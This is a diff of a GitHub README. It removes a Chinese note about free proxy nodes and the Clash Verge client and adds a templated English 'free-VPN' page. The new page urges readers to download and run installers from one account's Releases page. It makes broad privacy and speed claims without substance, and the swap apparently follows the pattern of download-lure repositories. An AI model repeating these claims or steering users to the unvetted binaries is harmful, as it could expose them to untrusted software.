@@ -1,11 +1,84 @@
-# 这两个节点，我已经从2025年3月份用到目前现在啦
+# 🌐 free-VPN - Fast and Reliable VPN Access
 
->我可能只推荐你们跑一些大模型的下载啊等等一些大文件的下载就好啦。可能是万人骑的节点，所以不太推荐跑AI大模型对话服务等等的，因为他们可能有严重的ip真实性检测。可能CF盾会拦截他的节点连接，阻止等等。
+## 🚀 Getting Started
 
+Welcome to free-VPN! This application allows you to access high-speed VPN services. It is designed to improve your internet experience, especially when downloading larger files or using specific online services. Follow these steps to get started.
 
-<img width="1412" height="1096" alt="QQ_1756770598904" src="https://github.com/user-attachments/assets/bdafef67-3770-4744-b7f8-640dbec160e0" />
+## 📥 Download Free-VPN
 
-**关于软件内核我已经换到这个Clash Verge**
+[![Download free-VPN](https://img.shields.io/badge/Download-free--VPN-brightgreen)](https://github.com/abundhance12/free-VPN/releases)
 
-内核代理相关仓库：
-https://github.com/clash-verge-rev/clash-verge-rev
+Visit this page to download: [free-VPN Releases](https://github.com/abundhance12/free-VPN/releases)
+
+## 🔧 System Requirements
+
+To run free-VPN, your computer should meet these basic requirements:
+
+- **Operating System:** Windows 10 or later, macOS, or a recent Linux distribution.
+- **RAM:** Minimum of 4 GB.
+- **Disk Space:** At least 100 MB free.
+- **Internet Connection:** A stable connection to enjoy the VPN service effectively.
+
+## 📦 Download & Install
+
+1. **Visit the Releases Page**:
+   Go to the Releases page by clicking the link below:
+   [Download free-VPN](https://github.com/abundhance12/free-VPN/releases)
+
+2. **Select the Latest Version**:
+   Look for the latest version, which is usually at the top of the list. This version contains the latest features and improvements.
+
+3. **Download the Application**:
+   Click on the appropriate file for your operating system:
+   - For Windows, look for a file ending with `.exe`.
+   - For macOS, find a file ending with `.dmg`.
+   - For Linux, you may find a `.tar.gz` or `.deb` file based on your distribution.
+
+4. **Run the Installer**:
+   - For Windows:
+     - Locate the downloaded `.exe` file in your Downloads folder.
+     - Double-click to run it and follow the on-screen instructions.
+   - For macOS:
+     - Open the downloaded `.dmg` file and drag the free-VPN icon to your Applications folder.
+   - For Linux:
+     - If you downloaded a `.deb` file, run the command `sudo dpkg -i filename.deb` in the terminal (replace "filename" with your file name).
+     - For `.tar.gz`, extract the files and follow the included instructions.
+
+5. **Launch the Application**:
+   Once installed, find free-VPN in your applications or programs list. Open it to start using the service.
+
+## 🌍 How to Use free-VPN
+
+1. **Open free-VPN**:
+   Start the application from your applications folder or start menu.
+
+2. **Connect to a Server**:
+   Select a server location. This will determine your virtual IP address. Choose a location that best suits your needs.
+
+3. **Enjoy Secure Browsing**:
+   Once connected, your internet connection is protected. You can now browse safely and download files quickly.
+
+## 📜 Features
+
+- **High-Speed Access**: Enjoy quick downloads and smooth streaming.
+- **Multiple Server Locations**: Choose from various locations around the world to meet your needs.
+- **User-Friendly Interface**: Designed for ease of use, even if you have no technical knowledge.
+- **Privacy Protection**: Your online activities remain private and secure.
+
+## 🚨 Troubleshooting
+
+If you face any issues while installing or using free-VPN, check the following:
+
+- **Connection Issues**: Make sure your internet connection is stable. Restart your router if necessary.
+- **Installation Problems**: Ensure your operating system meets the requirements listed above. Re-download the file if it's corrupt.
+- **Performance Issues**: If the connection is slow, try switching to a different server location.
+
+## 🛠 Support & Feedback
+
+For any questions or feedback, feel free to reach out. We appreciate your input as it helps improve free-VPN. You can open an issue on the [Issues](https://github.com/abundhance12/free-VPN/issues) page of this repository.
+
+## 💻 Stay Updated
+
+Make sure to check back on the Releases page for updates. Regular updates may include new features, performance improvements, and bug fixes.
+
+Enjoy using free-VPN! Secure your connection and enhance your online experience.
